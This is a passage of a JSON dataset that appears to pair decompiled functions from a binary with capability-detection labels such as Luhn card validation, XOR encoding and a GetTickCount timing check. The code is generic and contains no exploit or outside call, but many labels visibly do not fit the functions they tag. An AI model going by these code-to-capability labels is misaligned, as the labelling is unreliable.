return 0;\n}\n",
        "token_count": 351
    },
    "0001e414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001e414(ulong param_1)\n\n{\n    fcn.0001e26c(param_1);\n    return 0;\n}\n",
        "token_count": 35
    },
    "0001eea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001eea0(ulong arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    char in_R8B;\n    uchar auStack312 [272];\n    \n    iVar1 = fcn.0002f718();\n    fcn.00030e70(arg2 & 0xffffffff, auStack312, 0x104);\n    if (in_R8B == '\\0') {\n        if ((0x1a < iVar1) && (iVar1 = fcn.00061ad4(),  iVar1 == 0)) {\n            fcn.0003c1ec(arg2 & 0xffffffff);\n        }\n        if (*0x79f28 != 0) {\n            uVar5 = 0;\n            piVar2 = *0x79f30;\n            if (*0x79f28 != 0) {\n                do {\n                    if (*piVar2 == arg2) break;\n                    uVar3 = uVar5 + 1;\n                    uVar5 = uVar3;\n                    piVar2 = piVar2 + 2;\n                } while (uVar3 < *0x79f28);\n            }\n            uVar3 = uVar5;\n            if (uVar3 < *0x79f28 - 1) {\n                do {\n                    uVar3 = uVar3 + 1;\n                    fcn.00061a2c(*0x79f30 + uVar5 * 2, *0x79f30 + uVar3 * 2, 8);\n                    uVar4 = uVar5 + 1;\n                    uVar5 = uVar4;\n                } while (uVar4 < *0x79f28 - 1);\n            }\n            if (uVar5 < *0x79f28) {\n                uVar3 = *0x79f28 - 1;\n                uVar7 = *0x79f28;\n                uVar5 = uVar3 << 3;\n                *0x79f28 = uVar3;\n                if (uVar3 == 0) {\n                    fcn.0002fc50(*0x79f30);\n                    *0x79f30 = NULL;\n                }\n                else {\n                    piVar2 = fcn.0002fbc4(uVar5);\n                    if (piVar2 != NULL) {\n                        uVar8 = uVar7 << 3;\n                        if (uVar5 < uVar7 << 3) {\n                            uVar8 = uVar5;\n                        }\n                        fcn.000619f6(piVar2, *0x79f30, uVar8);\n                        fcn.0002fc50(*0x79f30);\n                        *0x79f30 = piVar2;\n                    }\n                }\n            }\n        }\n        fcn.00019e18(auStack312, arg2 & 0xffffffff);\n        fcn.0001e324(arg2 & 0xffffffff);\n    }\n    else {\n        uVar3 = 0;\n        if (*0x7a280 != 0) {\n            iVar6 = 0;\n            uVar4 = *0x7a280;\n            do {\n                if (*(iVar6 + *0x7a288) == arg1) {\n                    fcn.0001e26c(arg2 & 0xffffffff);\n                    uVar4 = *0x7a280;\n                }\n                uVar3 = uVar3 + 1;\n                iVar6 = iVar6 + 8;\n            } while (uVar3 < uVar4);\n        }\n        if ((0x1a < iVar1) && (iVar1 = fcn.00061ad4(auStack312, 0x11cd8),  iVar1 == 0)) {\n            fcn.0003cee4(arg2);\n        }\n    }\n    return;\n}\n",
        "token_count": 891
    },
    "0001f900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0001f900(uint64_t *arg1, ulong arg2, ulong arg3, uint8_t *arg4)\n\n{\n    uint8_t uVar1;\n    int64_t arg2_00;\n    uint32_t uVar2;\n    uint64_t uStackX32;\n    int32_t in_stack_00000028;\n    uchar auStack200 [144];\n    ulong var_1h;\n    \n    if (arg2 < 8) {\n        uStackX32 = 0;\n        fcn.000619f6(&uStackX32, arg1, arg2);\n    }\n    else {\n        uStackX32 = *arg1;\n    }\n    uVar1 = *arg4;\n    uVar2 = (in_stack_00000028 - uVar1) - 1;\n    uStackX32 = uStackX32 & 0xffffffff00000000 | uStackX32 ^ uVar2;\n    if (uVar2 != 0) {\n        fcn.0002c248(auStack200, arg2, arg1);\n        if (uVar1 == 0) {\n            fcn.0002bc38(arg4 + 1, arg3, in_stack_00000028 - 1, auStack200);\n        }\n        else {\n            arg2_00 = fcn.0002fbc4(in_stack_00000028 - 1);\n            if (arg2_00 == 0) {\n                uVar2 = 0xffffffff;\n            }\n            else {\n                fcn.0002bc38(arg4 + 1, arg2_00, in_stack_00000028 - 1, auStack200);\n                fcn.000619f6(arg3, arg2_00, uVar2);\n                fcn.0002fc50(arg2_00);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 440
    },
    "0001fa4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001fa4c(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t in_stack_00000028;\n    \n    while( true ) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        if (*(arg1 + 1) == arg2) break;\n        arg1 = *arg1;\n    }\n    if (*(arg1 + 0xc) != arg3) {\n        return 0;\n    }\n    if (*(arg1 + 2) != in_stack_00000028) {\n        return 0;\n    }\n    fcn.000619f6(arg4, arg1[3], *(arg1 + 2));\n    return 1;\n}\n",
        "token_count": 164
    },
    "0001fd08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0001fd08(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = fcn.00061afe();\n    if (uVar1 < 0) {\n        *(arg1 + -1 + arg2) = 0;\n        uVar1 = arg2 * 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "0001fd3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint32_t fcn.0001fd3c(char *arg1)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    \n    uVar4 = 0;\n    uVar6 = 0;\n    if ((arg1 == NULL) || (*arg1 == '\\0')) {\n        uVar6 = 0;\n    }\n    else {\n        uVar2 = 0xffffffffffffffff;\n        pcVar5 = arg1;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        uVar2 = uVar4;\n        if (uVar3 != 0) {\n            do {\n                pcVar5 = arg1 + uVar4;\n                uVar4 = uVar4 + 1;\n                uVar6 = uVar2 << 3 ^ *pcVar5;\n                uVar2 = uVar6;\n            } while (uVar4 < uVar3);\n        }\n        uVar6 = uVar6 ^ uVar3 + 1;\n        if (uVar6 == 0) {\n            uVar6 = 0xffffffff;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 335
    },
    "0001fe20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0001fe20(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.0002fbc4(0x28);\n    if (puVar1 != NULL) {\n        *puVar1 = arg2;\n        puVar1[1] = arg3;\n        puVar1[2] = arg4;\n        puVar1[3] = arg4;\n        *(puVar1 + 4) = 0;\n        *(puVar1 + 6) = 0;\n        *(puVar1 + 8) = *(arg1 + 0x38);\n        *(arg1 + 0x38) = puVar1;\n    }\n    return puVar1;\n}\n",
        "token_count": 176
    },
    "00020380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00020380(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((arg2 < 0x40000001) && (arg1 != 0)) {\n        fcn.0001fd9c(arg1);\n        (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 2);\n        iVar1 = (**(*(arg1 + 0x58) + 0x18))(*(arg1 + 0x60), arg2);\n        if (iVar1 != 0) {\n            fcn.00020184(arg1);\n            return 0xffffffff;\n        }\n        *(arg1 + 0x2c) = *(arg1 + 0x2c) + 1;\n        *(arg1 + 8) = arg2;\n        iVar1 = (**(*(arg1 + 0x58) + 0x30))(*(arg1 + 0x60), arg1 + 8, 0x2c);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00020184(arg1);\n            (**(*(arg1 + 0x58) + 0x38))(*(arg1 + 0x60), 1);\n            return uVar2;\n        }\n    }\n    return 3;\n}\n",
        "token_count": 304
    },
    "00021694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00021694(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iStackX32;\n    uchar auStack40 [24];\n    \n    uVar1 = fcn.00020640(&iStackX32, arg1, 0, auStack40);\n    if (uVar1 == 0) {\n        *(iStackX32 + 0x94) = arg2;\n        *(iStackX32 + 0x98) = arg3;\n        *(iStackX32 + 0x90) = 1;\n        fcn.0001feb8(auStack40);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 162
    },
    "000216e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.000216e8(uint32_t *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if ((arg1 != NULL) && (arg2 != 0)) {\n        iVar3 = *(arg2 + 0x2c) + 0x40;\n        uVar2 = arg1[7] + iVar3;\n        if (arg1[2] <= uVar2 && uVar2 != arg1[2]) {\n            uVar4 = arg1[3];\n            if (uVar4 < uVar2) {\n                uVar4 = (((arg1[5] - uVar4) + -1 + uVar2) / arg1[5]) * arg1[5] + uVar4;\n            }\n            if (arg1[4] <= uVar4) {\n                fcn.00020860(*arg1);\n                uVar4 = arg1[3];\n                if (uVar4 < iVar3 + arg1[7]) {\n                    uVar4 = (((arg1[5] - uVar4) + -1 + iVar3 + arg1[7]) / arg1[5]) * arg1[5] + uVar4;\n                }\n                if (arg1[4] <= uVar4) {\n                    return 0xffffffff;\n                }\n            }\n            iVar1 = fcn.00020380(arg1, uVar4);\n            if (iVar1 != 0) {\n                fcn.00020860(*arg1);\n                iVar1 = fcn.00020380(arg1, uVar4);\n                if (iVar1 != 0) {\n                    return 0xffffffff;\n                }\n            }\n        }\n        uVar2 = arg1[7];\n        iVar1 = (**(*(arg1 + 0x16) + 0x30))(*(arg1 + 0x18), arg2, 0x40, uVar2);\n        if (iVar1 == 0) {\n            arg1[7] = arg1[7] + iVar3;\n            arg1[6] = arg1[6] + 1;\n            arg1[0xb] = arg1[0xb] + 1;\n            iVar3 = (**(*(arg1 + 0x16) + 0x30))(*(arg1 + 0x18), arg1 + 2, 0x2c, 0);\n            if (iVar3 != 0) {\n                return 0xffffffff;\n            }\n            return uVar2;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 584
    },
    "00022604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00022604(ulong arg1, ulong arg2)\n\n{\n    int64_t arg4;\n    int64_t arg4_00;\n    int64_t iVar1;\n    int64_t arg3;\n    uchar auStack2088 [2048];\n    \n    arg4 = fcn.000305c4(arg1, 0x11ea0);\n    if (arg4 != 0) {\n        arg4_00 = fcn.000305c4(arg2, 0x11e9c);\n        if (arg4_00 == 0) {\n            fcn.0002fe58(arg4);\n        }\n        else {\n            do {\n                arg3 = fcn.0002fee4(auStack2088, 1, 0x800, arg4);\n                if (arg3 == 0) {\n                    fcn.0002fe58(arg4);\n                    fcn.0002fe58(arg4_00);\n                    return 0;\n                }\n                iVar1 = fcn.0002fe68(auStack2088, 1, arg3, arg4_00);\n            } while (iVar1 == arg3);\n            fcn.0002fe58(arg4);\n            fcn.0002fe58(arg4_00);\n            fcn.00030a28(arg2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 298
    },
    "00022a74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00022a74(char *arg1, char *arg2, ulong arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    char *pcVar8;\n    uchar auStack648 [20];\n    int32_t iStack628;\n    char acStack600 [272];\n    char acStack328 [280];\n    \n    uVar6 = 0xffffffffffffffff;\n    uVar3 = uVar6;\n    pcVar5 = arg1;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    uVar4 = uVar6;\n    pcVar5 = arg2;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    if (0x104 < ~uVar3 + (~uVar4 - 2)) {\n        return 0xffffffff;\n    }\n    pcVar5 = arg1;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5[acStack328 + -arg1] = cVar1;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    uVar3 = fcn.00061b04(acStack328, 0x2e);\n    uVar4 = fcn.00061b04(acStack328, 0x5c);\n    if (uVar3 == 0) {\ncode_r0x00022b30:\n        uVar3 = uVar6;\n        pcVar5 = acStack328;\n        do {\n            pcVar8 = pcVar5;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar8;\n        } while (cVar1 != '\\0');\n        iVar7 = 0;\n        do {\n            cVar1 = arg2[iVar7];\n            pcVar8[iVar7 + -1] = cVar1;\n            iVar7 = iVar7 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        if ((uVar4 != 0) && (uVar3 < uVar4)) {\n            uVar3 = 0;\n        }\n        if (uVar3 == 0) goto code_r0x00022b30;\n        iVar7 = uVar3 - arg2;\n        do {\n            cVar1 = *arg2;\n            arg2[iVar7] = cVar1;\n            arg2 = arg2 + 1;\n        } while (cVar1 != '\\0');\n    }\n    iVar2 = fcn.00030924(acStack328, auStack648);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    if (iStack628 == 0) {\n        return 0xffffffff;\n    }\n    iVar2 = fcn.00030924(arg1, auStack648);\n    if (iVar2 != 0) {\n        iVar2 = fcn.00022604(acStack328, arg1);\n        if (iVar2 == -1) {\n            return 0xffffffff;\n        }\n        goto code_r0x00022ca1;\n    }\n    pcVar5 = arg1;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5[acStack600 + -arg1] = cVar1;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    uVar3 = fcn.00061b04(acStack600, 0x2e);\n    uVar4 = fcn.00061b04(acStack600);\n    if (uVar3 == 0) {\ncode_r0x00022bf6:\n        pcVar5 = acStack600;\n        do {\n            pcVar8 = pcVar5;\n            if (uVar6 == 0) break;\n            uVar6 = uVar6 - 1;\n            pcVar8 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar8;\n        } while (cVar1 != '\\0');\n        iVar7 = 0;\n        do {\n            cVar1 = *(iVar7 + 0x11e94);\n            pcVar8[iVar7 + -1] = cVar1;\n            iVar7 = iVar7 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        if ((uVar4 != 0) && (uVar3 < uVar4)) {\n            uVar3 = 0;\n        }\n        if (uVar3 == 0) goto code_r0x00022bf6;\n        pcVar5 = 0x11e94;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5[uVar3 - 0x11e94] = cVar1;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n    }\n    iVar2 = fcn.00030924(acStack600, auStack648);\n    if (((iVar2 != 0) || (iVar2 = fcn.00030a28(acStack600),  iVar2 != -1)) &&\n       (iVar2 = fcn.00030d38(arg1, acStack600),  iVar2 != -1)) {\n        iVar2 = fcn.00022604(acStack328, arg1);\n        if (iVar2 != -1) {\ncode_r0x00022ca1:\n            if (arg3 != 0) {\n                fcn.00030a28(acStack328);\n            }\n            return 0;\n        }\n        fcn.00030a28(arg1);\n        fcn.00030d38(acStack600, arg1);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 1404
    },
    "00022cb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00022cb8(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    uchar auStackX8 [32];\n    uchar auStack536 [256];\n    uchar auStack280 [256];\n    \n    uVar1 = fcn.00026a7c(100, 0);\n    if (uVar1 != 0) {\n        uVar4 = 0x70;\n        piVar6 = 0x7a2e0;\n        uVar5 = uVar1;\n        do {\n            iVar2 = fcn.00026a28(uVar4 - 0xb, auStack280, 0x100, auStackX8);\n            if (iVar2 == 0) {\n                auStack536[0] = 0;\n                fcn.00026a28(uVar4, auStack536, 0x100, auStackX8);\n                iVar3 = fcn.00022868(auStack280, auStack536);\n                *piVar6 = iVar3;\n                if (iVar3 != 0) {\n                    piVar6 = piVar6 + 1;\n                }\n            }\n            uVar4 = uVar4 + 1;\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    fcn.0003fb10();\n    fcn.00031d58();\n    return;\n}\n",
        "token_count": 344
    },
    "00022d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00022d5c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong arg1_00;\n    ulong arg2;\n    uchar auStackX8 [32];\n    char acStack136 [112];\n    \n    fcn.0002591c();\n    fcn.00028164();\n    fcn.0002a0f0();\n    fcn.00022cb8();\n    fcn.00023554();\n    acStack136[0] = '\\0';\n    fcn.00026a28(0x22b, acStack136, 100, auStackX8);\n    if (acStack136[0] != '\\0') {\n        arg1 = 0;\n    }\n    iVar2 = 0;\n    *0x88cb0 = arg1;\n    if (arg1 == 0) {\n        iVar1 = fcn.0002ed80(0x88b88);\n        if (((iVar1 != 0) && (iVar1 = fcn.0002ed80(0x88b60),  iVar1 != 0)) &&\n           (iVar1 = fcn.0001a650(0x7a2d0, 0x24470, 0),  iVar1 == 0)) {\n            iVar1 = fcn.00026a7c(300, 0);\n            if (iVar1 == 0) goto code_r0x00022e7a;\n            iVar1 = fcn.0002ed80(0x88b68);\n            if ((iVar1 != 0) && (iVar1 = fcn.0002ed80(0x88ca8),  iVar1 != 0)) {\n                arg2 = 0x24530;\n                arg1_00 = 0x7a330;\n                goto code_r0x00022e39;\n            }\n        }\n    }\n    else {\n        iVar1 = fcn.0002ed80(0x88b78);\n        if (iVar1 != 0) {\n            arg2 = 0x245f0;\n            arg1_00 = 0x7a340;\ncode_r0x00022e39:\n            iVar1 = fcn.0001a650(arg1_00, arg2, 0);\n            if (iVar1 == 0) goto code_r0x00022e7a;\n        }\n    }\n    iVar2 = fcn.0002fde4();\ncode_r0x00022e7a:\n    if (iVar2 != 0) {\n        if (arg1 == 0) {\n            iVar1 = fcn.0002eec4(0x88b60);\n            if (iVar1 != 0) {\n                fcn.0002edfc(0x88b60);\n            }\n            iVar1 = fcn.0002eec4(0x88ca8);\n            if (iVar1 != 0) {\n                fcn.0002edfc(0x88ca8);\n            }\n            iVar1 = fcn.0002eec4(0x7a2d0);\n            if (iVar1 != 0) {\n                fcn.0003168c(0x7a2d0);\n                fcn.00031624(0x7a2d0);\n            }\n            iVar1 = fcn.0002eec4(0x7a330);\n            if (iVar1 != 0) {\n                fcn.0003168c(0x7a330);\n                fcn.00031624(0x7a330);\n            }\n            iVar1 = fcn.0002eec4(0x88b88);\n            if (iVar1 != 0) {\n                fcn.0002edfc(0x88b88);\n            }\n            iVar1 = fcn.0002eec4(0x88b68);\n            if (iVar1 != 0) {\n                fcn.0002edfc(0x88b68);\n            }\n        }\n        else {\n            iVar1 = fcn.0002eec4(0x88b78);\n            if (iVar1 != 0) {\n                fcn.0002edfc(0x88b78);\n            }\n            iVar1 = fcn.0002eec4(0x7a340);\n            if (iVar1 != 0) {\n                fcn.0003168c(0x7a340);\n                fcn.00031624(0x7a340);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 996
    },
    "0002328c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0002328c(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int64_t iVar3;\n    \n    uVar1 = fcn.0002fcf4(*arg1);\n    *arg1 = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[1]);\n    arg1[1] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[2]);\n    arg1[2] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[3]);\n    arg1[3] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[8]);\n    arg1[8] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[9]);\n    arg1[9] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[10]);\n    arg1[10] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[0xb]);\n    arg1[0xb] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[0xc]);\n    puVar2 = arg1 + 4;\n    arg1[0xc] = uVar1;\n    iVar3 = 4;\n    do {\n        uVar1 = fcn.0002fcf4(*puVar2);\n        *puVar2 = uVar1;\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 389
    },
    "00024778": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00024778(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t *puVar3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.0002fcf4(*arg1);\n    *arg1 = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[1]);\n    arg1[1] = uVar1;\n    uVar1 = fcn.0002fcf4(arg1[2]);\n    arg1[2] = uVar1;\n    uVar2 = fcn.0002fcf4(*(arg1 + 0xd));\n    *(arg1 + 0xd) = uVar2;\n    uVar2 = fcn.0002fcf4(*(arg1 + 0x11));\n    *(arg1 + 0x11) = uVar2;\n    uVar2 = fcn.0002fcf4(*(arg1 + 0x15));\n    *(arg1 + 0x15) = uVar2;\n    uVar2 = fcn.0002fcf4(*(arg1 + 0x19));\n    *(arg1 + 0x19) = uVar2;\n    uVar2 = fcn.0002fcf4(*(arg1 + 0x1d));\n    puVar3 = arg1 + 0x21;\n    *(arg1 + 0x1d) = uVar2;\n    iVar4 = 4;\n    do {\n        uVar1 = fcn.0002fcf4(*puVar3);\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return;\n}\n",
        "token_count": 403
    },
    "0002f214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002f214(int64_t *arg1)\n\n{\n    if ((arg1 != NULL) && (*arg1 != 0)) {\n        fcn.0002fc50(*arg1);\n        *arg1 = 0;\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00024b3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00024b3c(ulong noname_0, ulong arg2)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    \n    iVar3 = 0;\n    piVar2 = 0x64380;\n    do {\n        if (*piVar2 == arg2) {\n            uVar1 = (**(iVar3 * 0x10 + 0x64388))();\n            return uVar1;\n        }\n        iVar3 = iVar3 + 1;\n        piVar2 = piVar2 + 4;\n    } while (iVar3 < 0x1c);\n    return 0x21590001;\n}\n",
        "token_count": 152
    },
    "00024b9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00024b9c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uStack24;\n    \n    iVar1 = fcn.00021da8(0xffffffff, 1, arg1, arg3);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0002eec4(0x88b68);\n        if (iVar1 != 0) {\n            fcn.0002ee20(0x88b68);\n        }\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = iVar1 + 0x191U | 0x21590000;\n        iVar1 = fcn.00021da8(0xffffffff, 1, arg1, 0);\n        if (iVar1 != 0) {\n            uStack24 = iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return uStack24;\n}\n",
        "token_count": 225
    },
    "00024c48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00024c48(ulong arg1, ulong arg2, ulong *arg3, uint *arg4)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    ulong *puVar3;\n    \n    puVar3 = fcn.00060a74(arg2);\n    if (puVar3 == NULL) {\n        *arg3 = 0;\n        *arg4 = 0;\n    }\n    else {\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        *(puVar3 + 2) = 0;\n        uVar1 = fcn.00026a7c(1, 0);\n        *(puVar3 + 4) = arg1;\n        *puVar3 = uVar1;\n        uVar2 = fcn.0002fcf4(uVar1);\n        *puVar3 = uVar2;\n        uVar2 = fcn.0002fcf4(*(puVar3 + 4));\n        *(puVar3 + 4) = uVar2;\n        *arg3 = puVar3;\n        *arg4 = 0x14;\n    }\n    fcn.00026e2c(6, arg1, 0, 0);\n    return 0x215901f4;\n}\n",
        "token_count": 287
    },
    "00025058": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00025058(ulong noname_0, ulong noname_1, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint32_t auStackX32 [2];\n    int64_t aiStack40 [3];\n    \n    uVar3 = 0;\n    aiStack40[0] = 0;\n    iVar1 = fcn.000217f8(noname_0, noname_1, auStackX32, aiStack40);\n    if (iVar1 == 0) {\n        uVar4 = uVar3;\n        if (auStackX32[0] != 0) {\n            do {\n                if ((arg3 <= *(uVar3 + 0xc + aiStack40[0])) && (-1 < *(uVar3 + 0xc + aiStack40[0]))) {\n                    *(uVar3 + 4 + aiStack40[0]) = 0xffffffff;\n                }\n                uVar2 = uVar4 + 1;\n                uVar3 = uVar3 + 0x40;\n                uVar4 = uVar2;\n            } while (uVar2 < auStackX32[0]);\n        }\n        fcn.00021948(aiStack40[0], auStackX32[0]);\n        fcn.0001a254(aiStack40[0]);\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = iVar1 + 0x191U | 0x21590000;\n    }\n    return uVar2;\n}\n",
        "token_count": 359
    },
    "00025218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
